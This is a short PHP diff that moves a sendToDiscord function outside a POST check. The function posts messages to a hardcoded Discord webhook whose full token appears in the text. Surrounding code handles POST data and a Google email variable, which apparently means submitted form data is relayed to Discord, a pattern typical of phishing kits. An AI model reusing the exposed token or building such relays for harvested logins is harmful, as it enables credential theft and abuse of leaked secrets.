@@ -23,7 +23,7 @@ $logoutscript = '';
 if ($page) {
     $dashboard = base64_decode($page);
 }
-if ($_SERVER['REQUEST_METHOD'] === 'POST' ) {
+
 function sendToDiscord($message) {
     $webhookurl = "https://discord.com/api/webhooks/1246523083519692891/7Di8BJes3Ff-hEnscABxC3Csz2wruZCsB4V2f1Lwv_66UezGZlnBYPxyO59lU3IyZwsP";
     $json_data = json_encode(["content" => $message], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
@@ -39,7 +39,7 @@ function sendToDiscord($message) {
     $response = curl_exec($ch);
     curl_close($ch);
 }
-}
+
 
 if ($_POST || $googleemail) {
     $dbcheck = Data::openconnection();      
